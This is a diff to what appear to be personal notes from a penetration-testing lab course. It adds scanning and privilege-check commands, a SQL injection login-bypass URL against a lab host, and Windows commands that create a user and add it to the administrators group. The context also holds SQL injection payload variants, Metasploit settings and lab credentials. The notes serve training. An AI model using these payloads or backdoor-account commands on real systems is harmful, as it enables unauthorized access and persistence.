@@ -9,6 +9,10 @@ winops: 192.168.65.10, 10.50.25.36    xfreerdp /u:student /v:10.50.25.36 /dynami
 linops: 192.168.65.20, 10.50.32.167   ssh -X student@10.50.32.167
 creds: student // password
 
+nmap --min-rate 80000
+hostname
+sudo -l
+
 ## python server
 python3 -m http.server		# make python server in dir on lin ops
 # using web browser on target connect to lin ops IP:port given
@@ -171,6 +175,9 @@ enter password: dan' OR 1='1		# passes a TRUE bool through the password check sy
 	<value>' or 1='1;				# TRUE with end line char
 	<value>' or 1='1; #			# TRUE with end line and comment out
 	<value>' or 1='1; --		# same as above
+	
+# if vuln, get raw request from network dev tab and add that to url
+http://10.50.21.144/login.php?usrNameVar=dan' or 1='1&pwordVar=dan' or 1='1
 
 # when working with a web SQL table find # of rows & columns and start with the lowest
 	Rows:5
@@ -316,6 +323,9 @@ msfconsole
 	set lport 5555
 	exploit
 # dir = ls | type = cat |
+
+net user /add <username> <password>
+net localgroup administrators <username> /add
 
 
 ###### Post Exploitation
